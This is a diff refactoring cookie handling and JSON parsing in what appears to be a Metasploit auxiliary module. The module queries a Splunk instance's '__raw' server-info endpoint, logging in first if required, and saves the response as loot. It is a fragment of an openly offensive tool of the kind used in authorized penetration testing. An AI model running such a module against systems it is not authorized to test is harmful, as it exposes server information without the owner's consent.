@@ -29,7 +29,7 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'DisclosureDate' => '2018-06-08',
         'Notes' => {
-          'Stability' => [],
+          'Stability' => [CRASH_SAFE],
           'Reliability' => [],
           'SideEffects' => [IOC_IN_LOGS]
         }
@@ -57,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'No response received for authentication request')
     end
 
-    cval_value = res.get_cookies.match(/cval=([^;]*)/)[1]
+    cval_value = res.get_cookies.match(/cval=([^;]+)/)[1]
 
     unless cval_value
       fail_with(Failure::UnexpectedReply, 'Failed to retrieve the cval cookie for authentication')
@@ -73,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => login_url,
-      'cookie' => res.get_cookies,
+      'keep_cookies' => true,
       'vars_post' => auth_payload
     })
 
@@ -82,12 +82,12 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_good('Successfully authenticated on the Splunk instance')
-    res.get_cookies
   end
 
-  def get_contents(cookie = nil)
+  def get_contents
     request = {
       'uri' => normalize_uri(target_uri.path, 'en-US', 'splunkd', '__raw', 'services', 'server', 'info', 'server-info'),
+      'keep_cookies' => true,
       'vars_get' => {
         'output_mode' => 'json'
       }
@@ -107,14 +107,11 @@ class MetasploitModule < Msf::Auxiliary
     # if we hit 6.6.0 - 7.1.0 we need to auth first
     if res.body == '{"messages":[{"type":"ERROR","text":"See Other"}]}'
       print_status('Authentication required, logging in and re-attempting')
-      res = get_contents(authenticate)
+      authenticate
+      res = get_contents
     end
 
-    begin
-      j = JSON.parse(res.body)
-    rescue JSON::ParserError
-      fail_with(Failure::UnexpectedReply, 'Response not JSON parsable')
-    end
+    j = res.get_json_document
 
     loot_path = store_loot('splunk.system.status', 'application/json', datastore['RHOST'], res.body, 'system_status.json')
     print_good("Output saved to #{loot_path}")
